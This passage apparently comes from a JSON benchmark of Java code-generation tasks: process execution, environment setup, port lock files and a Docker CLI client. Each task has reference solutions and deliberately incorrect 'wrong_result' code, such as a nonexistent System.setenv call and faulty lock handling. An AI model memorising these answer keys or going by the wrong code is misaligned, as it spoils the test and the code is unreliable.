variables from a custom file (`custom_env.txt`) and applies them. It also sets the `LD_LIBRARY_PATH` and `PATH` variables to include the JRE binaries and native libraries.\n  - Input:\n    - `activity`: Activity - The Android activity context.\n    - `jreHome`: String - The home directory of the JRE.\n  - Output: None (void).\n- `setLdLibraryPath(String path)`: void - Sets the `LD_LIBRARY_PATH` environment variable to the specified path.\n  - Input:\n    - `path`: String - The new library path.\n  - Output: None (void).\n\nNote: The class assumes the presence of helper classes like `Logger`, `Tools`, `LauncherPreferences`, and `ExtraCore` for logging, file operations, and preference management. These dependencies should be handled appropriately in the implementation.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport android.system.Os;\nimport android.system.ErrnoException;\n\npublic static void redirectAndPrintJRELog() {\n    new Thread(new Runnable(){\n        int failTime = 0;\n        ProcessBuilder logcatPb;\n        @Override\n        public void run() {\n            try {\n                if (logcatPb == null) {\n                    logcatPb = new ProcessBuilder().command(\"logcat\", \"-v\", \"brief\", \"-s\", \"jrelog:I\", \"LIBGL:I\", \"NativeInput\").redirectErrorStream(true);\n                }\n\n                new ProcessBuilder().command(\"logcat\", \"-c\").redirectErrorStream(true).start();\n                java.lang.Process p = logcatPb.start();\n\n                byte[] buf = new byte[1024];\n                int len;\n                while ((len = p.getInputStream().read(buf)) != -1) {\n                    String currStr = new String(buf, 0, len);\n                    Logger.appendToLog(currStr);\n                }\n\n                if (p.waitFor() != 0) {\n                    failTime++;\n                    if (failTime <= 10) {\n                        run();\n                    } else {\n                        Logger.appendToLog(\"ERROR: Unable to get more log.\");\n                    }\n                }\n            } catch (Throwable e) {\n                Logger.appendToLog(\"Exception on logging thread:\\n\" + Log.getStackTraceString(e));\n            }\n        }\n    }).start();\n}\n\npublic static void setJavaEnvironment(Activity activity, String jreHome) throws Throwable {\n    Map<String, String> envMap = new ArrayMap<>();\n    envMap.put(\"POJAV_NATIVEDIR\", NATIVE_LIB_DIR);\n    envMap.put(\"JAVA_HOME\", jreHome);\n    envMap.put(\"HOME\", Tools.DIR_GAME_HOME);\n    envMap.put(\"TMPDIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"LIBGL_MIPMAP\", \"3\");\n    envMap.put(\"LIBGL_NOERROR\", \"1\");\n    envMap.put(\"LIBGL_NOINTOVLHACK\", \"1\");\n    envMap.put(\"LIBGL_NORMALIZE\", \"1\");\n\n    if(PREF_DUMP_SHADERS)\n        envMap.put(\"LIBGL_VGPU_DUMP\", \"1\");\n    if(PREF_ZINK_PREFER_SYSTEM_DRIVER)\n        envMap.put(\"POJAV_ZINK_PREFER_SYSTEM_DRIVER\", \"1\");\n    if(PREF_VSYNC_IN_ZINK)\n        envMap.put(\"POJAV_VSYNC_IN_ZINK\", \"1\");\n    if(Tools.deviceHasHangingLinker())\n        envMap.put(\"POJAV_EMUI_ITERATOR_MITIGATE\", \"1\");\n\n    envMap.put(\"LIBGL_ES\", (String) ExtraCore.getValue(ExtraConstants.OPEN_GL_VERSION));\n    envMap.put(\"FORCE_VSYNC\", String.valueOf(LauncherPreferences.PREF_FORCE_VSYNC));\n    envMap.put(\"MESA_GLSL_CACHE_DIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"force_glsl_extensions_warn\", \"true\");\n    envMap.put(\"allow_higher_compat_version\", \"true\");\n    envMap.put(\"allow_glsl_extension_directive_midshader\", \"true\");\n    envMap.put(\"MESA_LOADER_DRIVER_OVERRIDE\", \"zink\");\n    envMap.put(\"VTEST_SOCKET_NAME\", new File(Tools.DIR_CACHE, \".virgl_test\").getAbsolutePath());\n\n    envMap.put(\"LD_LIBRARY_PATH\", LD_LIBRARY_PATH);\n    envMap.put(\"PATH\", jreHome + \"/bin:\" + Os.getenv(\"PATH\"));\n    if(FFmpegPlugin.isAvailable) {\n        envMap.put(\"PATH\", FFmpegPlugin.libraryPath+\":\"+envMap.get(\"PATH\"));\n    }\n\n    if(LOCAL_RENDERER != null) {\n        envMap.put(\"POJAV_RENDERER\", LOCAL_RENDERER);\n        if(LOCAL_RENDERER.equals(\"opengles3_desktopgl_angle_vulkan\")) {\n            envMap.put(\"LIBGL_ES\", \"3\");\n            envMap.put(\"POJAVEXEC_EGL\",\"libEGL_angle.so\");\n        }\n    }\n\n    File customEnvFile = new File(Tools.DIR_GAME_HOME, \"custom_env.txt\");\n    if (customEnvFile.exists() && customEnvFile.isFile()) {\n        BufferedReader reader = new BufferedReader(new FileReader(customEnvFile));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            int index = line.indexOf(\"=\");\n            envMap.put(line.substring(0, index), line.substring(index + 1));\n        }\n        reader.close();\n    }\n\n    for (Map.Entry<String, String> env : envMap.entrySet()) {\n        try {\n            Os.setenv(env.getKey(), env.getValue(), true);\n        }catch (NullPointerException exception){\n            Log.e(\"JREUtils\", exception.toString());\n        }\n    }\n\n    File serverFile = new File(jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/server/libjvm.so\");\n    jvmLibraryPath = jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/\" + (serverFile.exists() ? \"server\" : \"client\");\n    setLdLibraryPath(jvmLibraryPath+\":\"+LD_LIBRARY_PATH);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport android.app.Activity;\nimport android.util.Log;\n\nimport java.io.BufferedReader;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class JREEnvironmentManager {\n\n    public static final String NATIVE_LIB_DIR = \"lib/native\";\n    public static final String LD_LIBRARY_PATH = \"LD_LIBRARY_PATH\";\n    public static final String LOCAL_RENDERER = \"opengles3_desktopgl_angle_vulkan\";\n    private String jvmLibraryPath;\n    private ProcessBuilder logcatPb;\n    private int failTime = 0;\n\n    public void redirectAndPrintJRELog() {\n        new Thread(() -> {\n            try {\n                if (logcatPb == null) {\n                    logcatPb = new ProcessBuilder(\"logcat\", \"-v\", \"threadtime\", \"*:W\");\n                }\n                Process process = logcatPb.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    Logger.log(line);\n                }\n            } catch (IOException e) {\n                failTime++;\n                if (failTime < 10) {\n                    redirectAndPrintJRELog();\n                } else {\n                    Log.e(\"JREEnvManager\", \"Failed to start logcat after multiple attempts.\");\n                }\n            }\n        }).start();\n    }\n\n    public void setJavaEnvironment(Activity activity, String jreHome) {\n        Map<String, String> env = new HashMap<>(System.getenv());\n        File customEnvFile = new File(activity.getFilesDir(), \"custom_env.txt\");\n        if (customEnvFile.exists()) {\n            ArrayList<String> lines = Tools.readFileLines(customEnvFile.getAbsolutePath());\n            for (String line : lines) {\n                if (!line.trim().isEmpty() && !line.startsWith(\"#\")) {\n                    String[] parts = line.split(\"=\", 2);\n                    if (parts.length == 2) {\n                        env.put(parts[0], parts[1]);\n                    }\n                }\n            }\n        }\n\n        StringBuilder ldLibPath = new StringBuilder(NATIVE_LIB_DIR);\n        if (env.containsKey(LD_LIBRARY_PATH)) {\n            ldLibPath.append(\":\").append(env.get(LD_LIBRARY_PATH));\n        }\n        env.put(LD_LIBRARY_PATH, ldLibPath.toString());\n\n        StringBuilder path = new StringBuilder(jreHome + \"/bin:\");\n        if (env.containsKey(\"PATH\")) {\n            path.append(\":\").append(env.get(\"PATH\"));\n        }\n        env.put(\"PATH\", path.toString());\n\n        env.put(\"LOCAL_RENDERER\", LOCAL_RENDERER);\n\n        System.setenv(env);\n        LauncherPreferences.savePreference(\"jre_home\", jreHome);\n        ExtraCore.updateExtraPaths(jreHome);\n    }\n\n    public void setLdLibraryPath(String path) {\n        System.setProperty(\"java.library.path\", path);\n        try {\n            Field field = ClassLoader.class.getDeclaredField(\"sys_paths\");\n            field.setAccessible(true);\n            field.set(null, null);\n        } catch (Exception ignored) {\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 288,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of shell commands from within an Android application, providing methods to start, monitor, and interact with the external process, including reading its output and checking its exit status.\n\nClass Description: The ShellCommand class encapsulates functionality for executing shell commands, handling process I/O streams, and managing process lifecycle. It's designed for Android environments (evidenced by android.util.Log usage) and provides both synchronous and asynchronous operation modes.\n\nAttributes:\nrt: [Runtime] - Reference to Java Runtime environment for process execution\ncommand: [String[]] - Array containing the shell command and its arguments\ntag: [String] - Identifier for logging purposes\nprocess: [Process] - Reference to the running process instance\nstdout: [BufferedReader] - Reader for process output stream\nerror: [String] - Stores any error message encountered during execution\nexitval: [int] - Exit value of the completed process (-1 if not terminated)\n\nMethods:\nShellCommand: [constructor](String[] command) -> [void] - Initializes with command to execute\nShellCommand: [constructor](String[] command, String tag) -> [void] - Initializes with command and logging tag\nstart: [void](boolean waitForExit) -> [void] - Starts the process, optionally waiting for completion\nwaitForExit: [void]() -> [void] - Blocks until process completes while reading output\nfinish: [void]() -> [void] - Cleans up process resources\ncheckForExit: [boolean]() -> [boolean] - Checks if process has terminated\nstdoutAvailable: [boolean]() -> [boolean] - Checks if output is ready to read\nreadStdoutBlocking: [String]() -> [String] - Reads a line of output (blocks until available)\nreadStdout: [String]() -> [String] - Reads a line of output if available (non-blocking)",
    "Canonical_solution": "import android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ShellCommand {\n    Runtime rt;\n    String[] command;\n    String tag = \"\";\n    Process process;\n    BufferedReader stdout;\n    public String error;\n    public int exitval;\n\n    public ShellCommand(String[] command, String tag) {\n        this(command);\n        this.tag = tag;\n    }\n\n    public ShellCommand(String[] command) {\n        this.command = command;\n        rt = Runtime.getRuntime();\n    }\n\n    public void start(boolean waitForExit) {\n        exitval = -1;\n        error = null;\n\n        try {\n            process = new ProcessBuilder().command(command).redirectErrorStream(true).start();\n            stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        } catch (Exception e) {\n            error = e.getCause().getMessage();\n            return;\n        }\n\n        if (waitForExit) {\n            waitForExit();\n        }\n    }\n\n    public void waitForExit() {\n        while (!checkForExit()) {\n            if (stdoutAvailable()) {\n                Log.d(\"AFWALL\", \"ShellCommand waitForExit [\" + tag\n                        + \"] discarding read: \" + readStdout());\n            } else {\n                try {\n                    Thread.sleep(100);\n                } catch (Exception e) {\n                    Log.d(\"AFWall\", \"waitForExit\", e);\n                }\n            }\n        }\n    }\n\n    public void finish() {\n        try {\n            if (stdout != null) {\n                stdout.close();\n            }\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"Exception finishing [\" + tag + \"]\", e);\n        }\n\n        if(process !=null) {\n            process.destroy();\n        }\n        process = null;\n    }\n\n    public boolean checkForExit() {\n        try {\n            if(process != null) {\n                exitval = process.exitValue();\n            } else {\n                finish();\n            }\n        } catch (IllegalThreadStateException e) {\n            return false;\n        }\n\n        finish();\n        return true;\n    }\n\n    public boolean stdoutAvailable() {\n        try {\n            return stdout.ready();\n        } catch (java.io.IOException e) {\n            Log.e(\"AFWall\", \"stdoutAvailable error\", e);\n            return false;\n        }\n    }\n\n    public String readStdoutBlocking() {\n        String line;\n        if (stdout == null) {\n            return null;\n        }\n        try {\n            line = stdout.readLine();\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"readStdoutBlocking error\", e);\n            return null;\n        }\n        if (line == null) {\n            return null;\n        } else {\n            return line + \"\\n\";\n        }\n    }\n\n    public String readStdout() {\n        if (stdout == null) {\n            return null;\n        }\n\n        try {\n            if (stdout.ready()) {\n                String line = stdout.readLine();\n                if (line == null) {\n                    return null;\n                } else {\n                    return line + \"\\n\";\n                }\n            } else {\n                return \"\";\n            }\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"readStdout error\", e);\n            return null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\n\npublic class ShellCommand {\n    private final Runtime rt = Runtime.getRuntime();\n    private final String[] command;\n    private final String tag;\n    private Process process;\n    private BufferedReader stdout;\n    private String error;\n    private int exitval = -1;\n\n    public ShellCommand(String[] command) {\n        this(command, \"ShellCommand\");\n    }\n\n    public ShellCommand(String[] command, String tag) {\n        this.command = command;\n        this.tag = tag;\n    }\n\n    public void start(boolean waitForExit) {\n        try {\n            process = rt.exec(command);\n            stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            if (waitForExit) {\n                waitForExit();\n            }\n        } catch (IOException e) {\n            error = e.getMessage();\n            Log.e(tag, \"Error starting process: \" + e.getMessage());\n        }\n    }\n\n    public void waitForExit() {\n        try {\n            exitval = process.waitFor();\n            finish();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            Log.e(tag, \"Interrupted while waiting for process to exit: \" + e.getMessage());\n        }\n    }\n\n    public void finish() {\n        if (stdout != null) {\n            try {\n                stdout.close();\n            } catch (IOException e) {\n                Log.e(tag, \"Error closing stdout reader: \" + e.getMessage());\n            }\n        }\n        if (process != null) {\n            process.destroy();\n        }\n    }\n\n    public boolean checkForExit() {\n        try {\n            int exitCode = process.exitValue();\n            exitval = exitCode;\n            return true;\n        } catch (IllegalThreadStateException e) {\n            return false;\n        }\n    }\n\n    public boolean stdoutAvailable() {\n        try {\n            return stdout.ready();\n        } catch (IOException e) {\n            Log.e(tag, \"Error checking stdout availability: \" + e.getMessage());\n            return false;\n        }\n    }\n\n    public String readStdoutBlocking() {\n        try {\n            return stdout.readLine();\n        } catch (IOException e) {\n            Log.e(tag, \"Error reading stdout line: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    public String readStdout() {\n        if (stdoutAvailable()) {\n            return readStdoutBlocking();\n        }\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 289,
    "Instruction": "Task Description: Implement a utility class that provides methods to retrieve system information, specifically the hostname, in a cross-platform manner (supporting both Linux and Windows operating systems).\n\nClass Description: The SystemInfoUtil class contains static methods for obtaining system information. It handles platform-specific differences internally and provides a consistent interface for retrieving the hostname.\n\nMethods:\n\nMethod1: getHostName() -> String - Retrieves the hostname of the current system. On Linux systems, it uses the 'uname -n' command, while on Windows it first tries the COMPUTERNAME environment variable and falls back to the 'hostname' command if needed. Returns an empty string if the hostname cannot be determined.\n\nMethod2: getUname(String param) -> String - A helper method that executes the 'uname' command with the specified parameter and returns its output. Primarily used internally by getHostName() for Linux systems. Returns an empty string if the command fails or times out.\n\nInput Parameters:\n- param (String): The parameter to pass to the uname command (e.g., \"-n\" for nodename)\n\nOutput:\n- String: The requested system information (hostname or uname output), or empty string if retrieval fails",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.TimeUnit;\n\npublic static String getHostName()\n{\n    String hostname = \"\";\n\n    if (Platform.isLinux())\n    {\n        hostname = getUname(\"-n\");\n    }\n    else if (Platform.isWindows())\n    {\n        hostname = System.getenv().get(\"COMPUTERNAME\");\n        try\n        {\n            Process process = new ProcessBuilder(\"hostname\").start();\n            process.waitFor(1, TimeUnit.SECONDS);\n            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            hostname = br.readLine().trim();\n        }\n        catch (IOException | InterruptedException ignored)\n        {\n        }\n    }\n    return hostname;\n}\n\npublic static String getUname(String param)\n{\n    String uname = \"\";\n    try\n    {\n        Process process = new ProcessBuilder(\"uname\", param).start();\n        process.waitFor(1, TimeUnit.SECONDS);\n        BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        uname = br.readLine().trim();\n    }\n    catch (IOException | InterruptedException ignored)\n    {\n    }\n    return uname;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class SystemInfoUtil {\n    public static String getHostName() {\n        String osName = System.getProperty(\"os.name\").toLowerCase();\n        if (osName.contains(\"win\")) {\n            return getWindowsHostName();\n        } else {\n            return getLinuxHostName();\n        }\n    }\n\n    private static String getWindowsHostName() {\n        String hostName = System.getenv(\"COMPUTERNAME\");\n        if (hostName != null && !hostName.isEmpty()) {\n            return hostName;\n        }\n        return executeCommand(\"hostname\", \"windows\");\n    }\n\n    private static String getLinuxHostName() {\n        return getUname(\"-n\");\n    }\n\n    public static String getUname(String param) {\n        return executeCommand(\"uname \" + param, \"linux\");\n    }\n\n    private static String executeCommand(String command, String osType) {\n        try {\n            ProcessBuilder processBuilder = new ProcessBuilder(command.split(\"\\\\s+\"));\n            if (\"windows\".equals(osType)) {\n                processBuilder.redirectErrorStream(true);\n            }\n            Process process = processBuilder.start();\n            if (!process.waitFor(3, java.util.concurrent.TimeUnit.SECONDS)) {\n                process.destroy();\n                return \"\";\n            }\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            StringBuilder output = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n            int exitCode = process.exitValue();\n            if (exitCode == 0) {\n                return output.toString().trim();\n            }\n        } catch (IOException | InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n        return \"\";\n    }\n}\n```"
  },
  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a class for managing temporary port allocations using file locks to ensure exclusive access to ports during testing or other temporary usage scenarios.\n\nClass Description: The TemporaryPorts class provides a mechanism to acquire and manage temporary port allocations using file-based locks. It creates lock files in a specified directory to represent port allocations and ensures exclusive access through FileChannel locks.\n\nAttributes:\n- DEFAULT_LOCK_DIRECTORY: [Path] - Default directory path for storing port lock files (\"/tmp/helios-test/ports/\")\n- lockDirectory: [Path] - Custom directory path for storing port lock files\n- ports: [List<AllocatedPort>] - List of currently allocated ports\n\nMethods:\n- TemporaryPorts([Path lockDirectory]) -> [void] - Constructor that initializes the lock directory and creates it if it doesn't exist\n- tryAcquire([String name, int port]) -> [AllocatedPort] - Attempts to acquire a port lock, returns AllocatedPort if successful or null if port is already locked\n- lock([int port, String name]) -> [AllocatedPort] - Internal method that performs the actual port locking operation using FileChannel\n- AllocatedPort([int port, Path path, FileChannel file, FileLock lock]) -> [void] - Nested class constructor representing an allocated port\n- port() -> [int] - Returns the allocated port number\n- release() -> [void] - Releases the port lock, closes the file channel, and deletes the lock file",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport com.google.common.collect.Lists;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.channels.OverlappingFileLockException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.List;\nimport static java.nio.file.StandardOpenOption.CREATE;\nimport static java.nio.file.StandardOpenOption.WRITE;\nimport static java.nio.charset.StandardCharsets.UTF_8;\nimport static java.lang.String.format;\n\npublic class TemporaryPorts {\n\n  private static final Path DEFAULT_LOCK_DIRECTORY = Paths.get(\"/tmp/helios-test/ports/\");\n  private final Path lockDirectory;\n  private final List<AllocatedPort> ports = Lists.newArrayList();\n\n  public TemporaryPorts(final Path lockDirectory) {\n    this.lockDirectory = lockDirectory;\n    try {\n      Files.createDirectories(lockDirectory);\n    } catch (IOException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  public AllocatedPort tryAcquire(final String name, final int port) {\n    final AllocatedPort allocatedPort = lock(port, name);\n    if (allocatedPort == null) {\n      return null;\n    }\n    ports.add(allocatedPort);\n    return allocatedPort;\n  }\n\n  private AllocatedPort lock(final int port, final String name) {\n    final Path path = lockDirectory.resolve(String.valueOf(port));\n    try {\n      final FileChannel file = FileChannel.open(path, CREATE, WRITE);\n      final FileLock lock = file.tryLock();\n      if (lock == null) {\n        return null;\n      }\n      file.write(ByteBuffer.wrap(format(\"%d %s%n\", port, name).getBytes(UTF_8)));\n      file.force(true);\n      return new AllocatedPort(port, path, file, lock);\n    } catch (OverlappingFileLockException e) {\n      return null;\n    } catch (IOException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  public static class AllocatedPort {\n    private final int port;\n    private final Path path;\n    private final FileChannel file;\n    private final FileLock lock;\n\n    private AllocatedPort(final int port, final Path path, FileChannel file, FileLock lock) {\n      this.port = port;\n      this.path = path;\n      this.file = file;\n      this.lock = lock;\n    }\n\n    public int port() {\n      return port;\n    }\n\n    public void release() {\n      try {\n        if (lock.isValid()) {\n          lock.release();\n        }\n        file.close();\n        Files.deleteIfExists(path);\n      } catch (IOException e) {\n        throw new RuntimeException(e);\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.*;\nimport java.nio.channels.*;\nimport java.nio.file.*;\nimport java.util.*;\n\npublic class TemporaryPorts {\n    public static final Path DEFAULT_LOCK_DIRECTORY = Paths.get(\"/tmp/helios-test/ports/\");\n    private final Path lockDirectory;\n    private final List<AllocatedPort> ports = new ArrayList<>();\n\n    public TemporaryPorts(Path lockDirectory) throws IOException {\n        this.lockDirectory = lockDirectory;\n        Files.createDirectories(lockDirectory);\n    }\n\n    public AllocatedPort tryAcquire(String name, int port) throws IOException {\n        return lock(port, name);\n    }\n\n    private AllocatedPort lock(int port, String name) throws IOException {\n        Path lockPath = lockDirectory.resolve(name + \"-\" + port + \".lock\");\n        if (Files.exists(lockPath)) {\n            try (FileChannel channel = FileChannel.open(lockPath, StandardOpenOption.READ)) {\n                if (channel.tryLock() != null) {\n                    return new AllocatedPort(port, lockPath, channel, channel.lock());\n                }\n            } catch (OverlappingFileLockException e) {\n                // Port is already locked\n                return null;\n            }\n        } else {\n            try (FileChannel channel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE)) {\n                FileLock lock = channel.lock();\n                AllocatedPort allocated = new AllocatedPort(port, lockPath, channel, lock);\n                ports.add(allocated);\n                return allocated;\n            }\n        }\n        return null;\n    }\n\n    public static class AllocatedPort {\n        private final int port;\n        private final Path path;\n        private final FileChannel file;\n        private final FileLock lock;\n\n        public AllocatedPort(int port, Path path, FileChannel file, FileLock lock) {\n            this.port = port;\n            this.path = path;\n            this.file = file;\n            this.lock = lock;\n        }\n\n        public int port() {\n            return port;\n        }\n\n        public void release() throws IOException {\n            if (lock != null && !lock.isValid()) {\n                lock.release();\n            }\n            if (file != null) {\n                file.close();\n            }\n            Files.delete(path);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 290,
    "Instruction": "Task Description: Create a Java class that implements a Docker client using ProcessBuilder to interact with the Docker CLI, handling process execution, input/output streams, and error handling.\n\nClass Description: CliDockerClient is a Docker client implementation that uses ProcessBuilder to execute Docker CLI commands. It manages process creation, stream handling, and timeout control for Docker operations.\n\nAttributes:\n- processBuilderFactory: Function<List<String>, ProcessBuilder> - Factory function to create ProcessBuilder instances configured for Docker commands\n- DEFAULT_DOCKER_CLIENT: Path - Default path to the Docker executable\n- DOCKER_OUTPUT_TIMEOUT: Long - Timeout duration for Docker command execution (10 minutes)\n\nMethods:\n- CliDockerClient(Path, Map<String,String>) -> void - Constructor that initializes the client with Docker executable path and environment variables\n- CliDockerClient(Function<List<String>,ProcessBuilder>) -> void - Internal constructor accepting a ProcessBuilder factory function\n- defaultProcessBuilderFactory(String,ImmutableMap<String,String>) -> Function<List<String>,ProcessBuilder> - Creates default ProcessBuilder factory with Docker executable and environment\n- getStderrOutput(Process) -> String - Helper method to read error stream from a process\n- docker(String...) -> Process - Executes a Docker subcommand and returns the Process instance\n- info() -> DockerInfoDetails - Executes 'docker info' command and returns parsed information\n- fetchInfoDetails() -> DockerInfoDetails - Internal method to fetch and parse Docker info details",
    "Canonical_solution": "import com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.google.cloud.tools.jib.api.DescriptorDigest;\nimport com.google.cloud.tools.jib.api.DockerClient;\nimport com.google.cloud.tools.jib.api.DockerInfoDetails;\nimport com.google.cloud.tools.jib.api.ImageDetails;\nimport com.google.cloud.tools.jib.api.ImageReference;\nimport com.google.cloud.tools.jib.http.NotifyingOutputStream;\nimport com.google.cloud.tools.jib.image.ImageTarball;\nimport com.google.cloud.tools.jib.json.JsonTemplate;\nimport com.google.cloud.tools.jib.json.JsonTemplateMapper;\nimport com.google.common.collect.ImmutableMap;\nimport com.google.common.io.ByteStreams;\nimport com.google.common.io.CharStreams;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.security.DigestException;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.function.Consumer;\nimport java.util.function.Function;\n\npublic class CliDockerClient implements DockerClient {\n\n  public static final Path DEFAULT_DOCKER_CLIENT = Paths.get(\"docker\");\n  public static final Long DOCKER_OUTPUT_TIMEOUT = (long) 10 * 60 * 1000;\n\n  private final Function<List<String>, ProcessBuilder> processBuilderFactory;\n\n  public CliDockerClient(Path dockerExecutable, Map<String, String> dockerEnvironment) {\n    this(\n        defaultProcessBuilderFactory(\n            dockerExecutable.toString(), ImmutableMap.copyOf(dockerEnvironment)));\n  }\n\n  CliDockerClient(Function<List<String>, ProcessBuilder> processBuilderFactory) {\n    this.processBuilderFactory = processBuilderFactory;\n  }\n\n  private static Function<List<String>, ProcessBuilder> defaultProcessBuilderFactory(\n      String dockerExecutable, ImmutableMap<String, String> dockerEnvironment) {\n    return dockerSubCommand -> {\n      List<String> dockerCommand = new ArrayList<>(1 + dockerSubCommand.size());\n      dockerCommand.add(dockerExecutable);\n      dockerCommand.addAll(dockerSubCommand);\n\n      ProcessBuilder processBuilder = new ProcessBuilder(dockerCommand);\n      Map<String, String> environment = processBuilder.environment();\n      environment.putAll(dockerEnvironment);\n\n      return processBuilder;\n    };\n  }\n\n  private static String getStderrOutput(Process process) {\n    try (InputStreamReader stderr =\n        new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8)) {\n      return CharStreams.toString(stderr);\n    } catch (IOException ex) {\n      return \"unknown (failed to read error message from stderr due to \" + ex.getMessage() + \")\";\n    }\n  }\n\n  private Process docker(String... subCommand) throws IOException {\n    return processBuilderFactory.apply(Arrays.asList(subCommand)).start();\n  }\n\n  @Override\n  public DockerInfoDetails info() throws IOException, InterruptedException {\n    ExecutorService executor = Executors.newSingleThreadExecutor();\n    Future<DockerInfoDetails> readerFuture = executor.submit(this::fetchInfoDetails);\n    try {\n      DockerInfoDetails details = readerFuture.get(DOCKER_OUTPUT_TIMEOUT, TimeUnit.MILLISECONDS);\n      return details;\n    } catch (TimeoutException e) {\n      readerFuture.cancel(true);\n      throw new IOException(\"Timeout reached while waiting for 'docker info' output\");\n    } catch (ExecutionException e) {\n      throw new IOException(\"Failed to read output of 'docker info': \" + e.getMessage());\n    } finally {\n      executor.shutdownNow();\n    }\n  }\n\n  private DockerInfoDetails fetchInfoDetails() throws IOException, InterruptedException {\n    Process infoProcess = docker(\"info\", \"-f\", \"{{json .}}\");\n    InputStream inputStream = infoProcess.getInputStream();\n    if (infoProcess.waitFor() != 0) {\n      throw new IOException(\n          \"'docker info' command failed with error: \" + getStderrOutput(infoProcess));\n    }\n    return JsonTemplateMapper.readJson(inputStream, DockerInfoDetails.class);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.*;\nimport java.nio.file.Path;\nimport java.time.Duration;\nimport java.util.*;\nimport java.util.concurrent.*;\nimport java.util.function.Function;\nimport java.util.stream.Collectors;\n\npublic class CliDockerClient {\n    private final Function<List<String>, ProcessBuilder> processBuilderFactory;\n    public static final Path DEFAULT_DOCKER_CLIENT = Path.of(\"docker\");\n    public static final Long DOCKER_OUTPUT_TIMEOUT = 600_000L;\n\n    public CliDockerClient(Path dockerPath, Map<String, String> environment) {\n        this(defaultProcessBuilderFactory(dockerPath.toString(), ImmutableMap.copyOf(environment)));\n    }\n\n    public CliDockerClient(Function<List<String>, ProcessBuilder> processBuilderFactory) {\n        this.processBuilderFactory = processBuilderFactory;\n    }\n\n    private static Function<List<String>, ProcessBuilder> defaultProcessBuilderFactory(String dockerBinary, Map<String, String> environment) {\n        return command -> {\n            List<String> fullCommand = new ArrayList<>();\n            fullCommand.add(dockerBinary);\n            fullCommand.addAll(command);\n            ProcessBuilder pb = new ProcessBuilder(fullCommand);\n            if (environment != null && !environment.isEmpty()) {\n                pb.environment().putAll(environment);\n            }\n            return pb;\n        };\n    }\n\n    private static String getStderrOutput(Process process) throws IOException {\n        StringBuilder stderr = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                stderr.append(line).append(\"\\n\");\n            }\n        }\n        return stderr.toString();\n    }\n\n    public Process docker(String... subCommands) throws IOException, InterruptedException {\n        List<String> commandList = Arrays.asList(subCommands);\n        ProcessBuilder pb = processBuilderFactory.apply(commandList);\n        Process process = pb.start();\n\n        ExecutorService executor = Executors.newSingleThreadExecutor();\n        